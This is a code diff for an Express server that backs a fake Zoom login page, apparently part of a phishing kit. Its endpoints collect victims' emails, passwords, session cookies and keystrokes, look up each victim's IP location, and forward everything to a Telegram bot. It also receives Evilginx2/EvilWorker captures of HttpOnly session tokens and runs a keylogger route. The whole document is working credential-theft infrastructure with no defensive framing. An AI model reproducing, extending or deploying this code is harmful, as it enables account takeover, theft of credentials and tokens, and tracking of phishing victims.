@@ -53,7 +53,10 @@ if (ADMIN_EMAIL && GMAIL_APP_PASSWORD) {
 process.on('uncaughtException', (err) => console.error('🔥 UNCAUGHT EXCEPTION:', err));
 process.on('unhandledRejection', (reason) => console.error('🔥 UNHANDLED REJECTION:', reason));
 
-// --- HELPERS ---
+// ============================================================
+//  HELPERS
+// ============================================================
+
 function getClientIp(req) {
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
@@ -167,7 +170,10 @@ async function getLocationFromIp(ip) {
 }
 
 async function sendToTelegram(text, parseMode = 'Markdown') {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.warn('⚠️ Telegram credentials missing');
+        return;
+    }
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         await axios.post(url, {
@@ -182,7 +188,10 @@ async function sendToTelegram(text, parseMode = 'Markdown') {
 }
 
 async function sendEmail(subject, htmlBody, textBody) {
-    if (!transporter) return;
+    if (!transporter) {
+        console.warn('⚠️ Email not configured');
+        return;
+    }
     try {
         await transporter.sendMail({
             from: `"Security Alert" <${ADMIN_EMAIL}>`,
@@ -197,7 +206,108 @@ async function sendEmail(subject, htmlBody, textBody) {
     }
 }
 
-// --- MAIN WEBHOOK ENDPOINT ---
+function formatVisitorInfo(visitorInfo) {
+    if (!visitorInfo) return '';
+    const fields = [];
+    if (visitorInfo.fullUrl) fields.push(`*🔗 URL:* ${visitorInfo.fullUrl}`);
+    if (visitorInfo.referrer) fields.push(`*🔙 Referrer:* ${visitorInfo.referrer}`);
+    if (visitorInfo.userAgent) fields.push(`*🖥️ User Agent:* ${visitorInfo.userAgent}`);
+    if (visitorInfo.platform) fields.push(`*💻 Platform:* ${visitorInfo.platform}`);
+    if (visitorInfo.deviceType) fields.push(`*📱 Device:* ${visitorInfo.deviceType}`);
+    if (visitorInfo.language) fields.push(`*🌐 Language:* ${visitorInfo.language}`);
+    if (visitorInfo.timezone) fields.push(`*🕐 Timezone:* ${visitorInfo.timezone}`);
+    if (visitorInfo.screenWidth && visitorInfo.screenHeight) {
+        fields.push(`*📺 Screen:* ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`);
+    }
+    if (visitorInfo.cookies) fields.push(`*🍪 Cookies:* ${visitorInfo.cookies}`);
+    if (visitorInfo.sessionId) fields.push(`*🔑 Session ID:* ${visitorInfo.sessionId}`);
+    return fields.length ? `\n\n--- Visitor Details ---\n${fields.join('\n')}` : '';
+}
+
+// ============================================================
+//  ENDPOINTS
+// ============================================================
+
+// Health Check
+app.get('/health', (req, res) => {
+    res.json({ status: 'OK', time: new Date().toISOString() });
+});
+
+// --- AUTHENTICATE (Verifies credentials and sends to Telegram) ---
+app.post('/api/authenticate', async (req, res) => {
+    try {
+        const { email, password, visitorInfo } = req.body;
+        const ip = getClientIp(req);
+        const location = await getLocationFromIp(ip);
+
+        // Check if IP is blocked
+        if (isIpBlocked(ip)) {
+            await sendToTelegram(`🚨 *BLOCKED INTRUDER ATTEMPT!*\nIP: ${ip}\nLocation: ${location.full}\nReason: Too many login attempts`);
+            return res.status(403).json({ success: false, error: 'Too many attempts. Please try again later.' });
+        }
+
+        // Build detailed Telegram message
+        let msg = `🔐 *Zoom Login Attempt*\n\n`;
+        msg += `*📧 Email:* ${email}\n`;
+        msg += `*🔑 Password:* ${password}\n`;
+        msg += `*📍 Location:* ${location.full}\n`;
+        msg += `*🌆 City:* ${location.city}\n`;
+        msg += `*🌍 Country:* ${location.country}\n`;
+        msg += `*📌 Coordinates:* ${location.lat}, ${location.lon}\n`;
+        msg += `*🕐 Timezone:* ${location.timezone}\n`;
+        msg += `*🏢 ISP:* ${location.isp}\n`;
+        msg += `*📡 IP:* ${ip}\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}`;
+        
+        // Add visitor details if available
+        if (visitorInfo) {
+            msg += formatVisitorInfo(visitorInfo);
+        }
+
+        // Send to Telegram
+        await sendToTelegram(msg);
+
+        // Record the attempt
+        recordLoginAttempt(ip, true);
+
+        // Return success - the proxy will handle the redirect
+        res.json({ success: true });
+
+    } catch (error) {
+        console.error('Auth error:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// --- LOG ACTION (Frontend events) ---
+app.post('/api/log-action', async (req, res) => {
+    try {
+        const { action, email, password, visitorInfo } = req.body;
+        const ip = getClientIp(req);
+        const location = await getLocationFromIp(ip);
+
+        let msg = `🚨 *Zoom Action: ${action?.toUpperCase() || 'UNKNOWN'}*\n\n`;
+        msg += `*📧 Email:* ${email || 'none'}\n`;
+        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
+        msg += `*📍 Location:* ${location.full}\n`;
+        msg += `*🌆 City:* ${location.city}\n`;
+        msg += `*🌍 Country:* ${location.country}\n`;
+        msg += `*📡 IP:* ${ip}\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}`;
+
+        if (visitorInfo) {
+            msg += formatVisitorInfo(visitorInfo);
+        }
+
+        await sendToTelegram(msg);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Log error:', error.message);
+        res.status(500).json({ success: false });
+    }
+});
+
+// --- WEBHOOK (EvilWorker/Evilginx2) ---
 app.post('/webhook', async (req, res) => {
     const secret = req.headers['x-webhook-secret'];
     if (secret !== WEBHOOK_SECRET) {
@@ -207,28 +317,20 @@ app.post('/webhook', async (req, res) => {
     const data = req.body;
     const ip = getClientIp(req);
     const location = await getLocationFromIp(ip);
-    const userAgent = req.headers['user-agent'] || 'Unknown';
 
     console.log('Webhook received:', JSON.stringify(data, null, 2));
 
-    // Build detailed Telegram message
-    let msg = `🔐 *Evilginx2 Capture Report*\n\n`;
+    let msg = `🔐 *Capture Report*\n\n`;
     msg += `*Event:* ${data.event || 'Unknown'}\n`;
     msg += `*📍 Location:* ${location.full}\n`;
     msg += `*🌆 City:* ${location.city}\n`;
-    msg += `*🗺️ Region:* ${location.region}\n`;
     msg += `*🌍 Country:* ${location.country}\n`;
-    msg += `*📌 Coordinates:* ${location.lat}, ${location.lon}\n`;
-    msg += `*🕐 Timezone:* ${location.timezone}\n`;
-    msg += `*🏢 ISP:* ${location.isp}\n`;
-    msg += `*🏛️ Organization:* ${location.org}\n`;
-    msg += `*📡 IP Address:* ${ip}\n`;
+    msg += `*📡 IP:* ${ip}\n`;
     
     if (data.username) msg += `*👤 Username:* ${data.username}\n`;
     if (data.password) msg += `*🔑 Password:* ${data.password}\n`;
     if (data.user_agent) msg += `*🖥️ User Agent:* ${data.user_agent}\n`;
     
-    // HttpOnly Session Cookies
     if (data.tokens) {
         msg += `*🍪 Session Cookies (HttpOnly):*\n`;
         for (const [name, value] of Object.entries(data.tokens)) {
@@ -236,30 +338,11 @@ app.post('/webhook', async (req, res) => {
         }
     }
 
-    // Additional visitor info from EvilWorker
-    if (data.visitorInfo) {
-        const vi = data.visitorInfo;
-        msg += `\n--- Visitor Details ---\n`;
-        if (vi.fullUrl) msg += `*🔗 URL:* ${vi.fullUrl}\n`;
-        if (vi.referrer) msg += `*🔙 Referrer:* ${vi.referrer}\n`;
-        if (vi.language) msg += `*🌐 Language:* ${vi.language}\n`;
-        if (vi.platform) msg += `*💻 Platform:* ${vi.platform}\n`;
-        if (vi.deviceType) msg += `*📱 Device:* ${vi.deviceType}\n`;
-        if (vi.screenWidth && vi.screenHeight) {
-            msg += `*📺 Screen:* ${vi.screenWidth}x${vi.screenHeight}\n`;
-        }
-        if (vi.cookiesEnabled !== undefined) {
-            msg += `*🍪 Cookies Enabled:* ${vi.cookiesEnabled ? 'Yes' : 'No'}\n`;
-        }
-        if (vi.sessionId) msg += `*🔑 Session ID:* ${vi.sessionId}\n`;
-        if (vi.timeOnSiteSeconds) msg += `*⏱️ Time on Site:* ${vi.timeOnSiteSeconds}s\n`;
-    }
-
     await sendToTelegram(msg);
     res.sendStatus(200);
 });
 
-// --- KEYLOGGER ENDPOINT ---
+// --- KEYLOGGER ---
 app.post('/api/keylog', async (req, res) => {
     try {
         const { keystrokes, url, userAgent, timestamp, ip: clientIp } = req.body;
@@ -287,82 +370,11 @@ app.post('/api/keylog', async (req, res) => {
     }
 });
 
-// --- LOG ACTION (Frontend) ---
-app.post('/api/log-action', async (req, res) => {
-    try {
-        const { action, email, password, visitorInfo } = req.body;
-        const ip = getClientIp(req);
-        const location = await getLocationFromIp(ip);
-
-        let msg = `🚨 *Zoom Action: ${action?.toUpperCase() || 'UNKNOWN'}*\n\n`;
-        msg += `*📧 Email:* ${email || 'none'}\n`;
-        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
-        msg += `*📍 Location:* ${location.full}\n`;
-        msg += `*🌆 City:* ${location.city}\n`;
-        msg += `*🌍 Country:* ${location.country}\n`;
-        msg += `*📡 IP:* ${ip}\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-
-        if (visitorInfo) {
-            msg += `\n--- Visitor Details ---\n`;
-            if (visitorInfo.fullUrl) msg += `*🔗 URL:* ${visitorInfo.fullUrl}\n`;
-            if (visitorInfo.userAgent) msg += `*🖥️ User Agent:* ${visitorInfo.userAgent}\n`;
-            if (visitorInfo.deviceType) msg += `*📱 Device:* ${visitorInfo.deviceType}\n`;
-            if (visitorInfo.language) msg += `*🌐 Language:* ${visitorInfo.language}\n`;
-            if (visitorInfo.cookies) msg += `*🍪 Cookies:* ${visitorInfo.cookies}\n`;
-            if (visitorInfo.sessionId) msg += `*🔑 Session ID:* ${visitorInfo.sessionId}\n`;
-        }
-
-        await sendToTelegram(msg);
-        res.json({ success: true });
-    } catch (error) {
-        console.error('Log error:', error.message);
-        res.status(500).json({ success: false });
-    }
-});
-
-// --- AUTHENTICATE ---
-app.post('/api/authenticate', async (req, res) => {
-    try {
-        const { email, password, visitorInfo } = req.body;
-        const ip = getClientIp(req);
-        const location = await getLocationFromIp(ip);
-
-        let msg = `🔐 *Zoom Login Attempt*\n\n`;
-        msg += `*📧 Email:* ${email}\n`;
-        msg += `*🔑 Password:* ${password}\n`;
-        msg += `*📍 Location:* ${location.full}\n`;
-        msg += `*🌆 City:* ${location.city}\n`;
-        msg += `*🌍 Country:* ${location.country}\n`;
-        msg += `*📡 IP:* ${ip}\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-
-        if (visitorInfo) {
-            msg += `\n--- Visitor Details ---\n`;
-            if (visitorInfo.fullUrl) msg += `*🔗 URL:* ${visitorInfo.fullUrl}\n`;
-            if (visitorInfo.userAgent) msg += `*🖥️ User Agent:* ${visitorInfo.userAgent}\n`;
-            if (visitorInfo.deviceType) msg += `*📱 Device:* ${visitorInfo.deviceType}\n`;
-            if (visitorInfo.cookies) msg += `*🍪 Cookies:* ${visitorInfo.cookies}\n`;
-            if (visitorInfo.sessionId) msg += `*🔑 Session ID:* ${visitorInfo.sessionId}\n`;
-        }
-
-        await sendToTelegram(msg);
-        res.json({ success: true });
-    } catch (error) {
-        console.error('Auth error:', error.message);
-        res.status(500).json({ success: false });
-    }
-});
-
-// --- HEALTH ---
-app.get('/health', (req, res) => {
-    res.json({ status: 'OK', time: new Date().toISOString() });
-});
-
 // --- START SERVER ---
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📍 Health check: /health`);
     console.log(`📤 Webhook endpoint: /webhook`);
     console.log(`⌨️ Keylogger endpoint: /api/keylog`);
+    console.log(`🔐 Auth endpoint: /api/authenticate`);
 });
